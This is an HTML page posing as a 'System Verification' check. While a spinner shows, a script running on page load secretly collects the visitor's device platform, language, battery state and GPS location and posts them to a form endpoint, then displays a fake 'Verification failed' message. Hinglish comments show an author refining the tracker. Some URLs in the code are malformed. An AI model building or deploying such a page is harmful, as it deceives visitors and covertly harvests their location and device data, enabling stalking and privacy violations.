<!DOCTYPE html>
<html>
<head>
    <title>System Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 100px; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p id="msg">Verifying your secure connection...</p>

    <script>
        // ✅ BILKUL SAHI DETAILS
        const FORM_URL = "https://google.com"; 
        const ENTRY_ID = "entry.515118501"; 

        async function collectAndSend() {
            try {
                let report = `Device: ${navigator.platform} | Lang: ${navigator.language} `;
                
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    report += `| Batt: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'}) `;
                }

                // Location lena (Is line ko maine sahi kar diya hai)
                navigator.geolocation.getCurrentPosition((p) => {
                    report += `| Map: https://google.com{p.coords.latitude},${p.coords.longitude}`;
                    dispatch(report);
                }, () => {
                    report += `| Loc: Denied`;
                    dispatch(report);
                });

            } catch (e) { dispatch("Error collecting data"); }
        }

        function dispatch(data) {
            const formData = new FormData();
            formData.append(ENTRY_ID, data);

            fetch(FORM_URL, {
                method: "POST",
                mode: "no-cors",
                body: formData
            }).then(() => {
                setTimeout(() => {
                    document.getElementById('msg').innerText = "Verification failed. Please try again later.";
                }, 3000);
            });
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>
